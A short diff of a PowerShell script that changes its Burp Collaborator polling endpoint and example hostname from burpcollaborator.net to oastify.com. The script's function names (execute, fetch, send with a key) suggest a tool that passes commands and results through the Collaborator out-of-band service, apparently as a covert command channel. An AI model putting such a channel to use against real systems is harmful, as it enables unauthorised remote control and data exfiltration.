@@ -89,7 +89,7 @@ Function execute($command) {
 
 Function fetch($biid) {
 
-    $url = 'https://polling.burpcollaborator.net/burpresults'
+    $url = 'https://polling.oastify.com/burpresults'
     $parameters = @{
         "biid" = "$biid"
     }
@@ -124,7 +124,7 @@ Function send($hostname, $command, $key, $result) {
 
 
 # Required arguments
-$hostname = $args[0] # hostname-2.burpcollaborator.net
+$hostname = $args[0] # hostname-2.oastify.com
 $biid = $args[1] # biid-1=
 
 $secureString = Read-Host -AsSecureString -Prompt 'Enter Key'
